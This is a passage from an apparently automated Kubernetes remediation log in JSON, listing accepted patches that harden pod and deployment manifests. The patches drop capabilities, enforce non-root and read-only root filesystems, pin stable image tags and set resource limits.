    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01569",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "errors": []
  },
  {
    "id": "01570",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "errors": []
  },
  {
    "id": "01571",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "errors": []
  },
  {
    "id": "01572",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "errors": []
  },
  {
    "id": "01573",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01574",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01575",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01576",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01577",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01578",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01579",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01580",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01581",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01582",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: busybox2\n    image: busybox:stable\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01583",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-example\nspec:\n  containers:\n  - image: scheele/reverseproxy:stable\n    name: reverseproxy\n    imagePullPolicy: Always\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 1024Mi\n        cpu: 500m\n    ports:\n    - containerPort: 8080\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01584",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-example\nspec:\n  containers:\n  - image: scheele/reverseproxy:stable\n    name: reverseproxy\n    imagePullPolicy: Always\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 1024Mi\n        cpu: 500m\n    ports:\n    - containerPort: 8080\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01585",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-example\nspec:\n  containers:\n  - image: scheele/reverseproxy:stable\n    name: reverseproxy\n    imagePullPolicy: Always\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 1024Mi\n        cpu: 500m\n    ports:\n    - containerPort: 8080\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01586",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01587",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01588",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
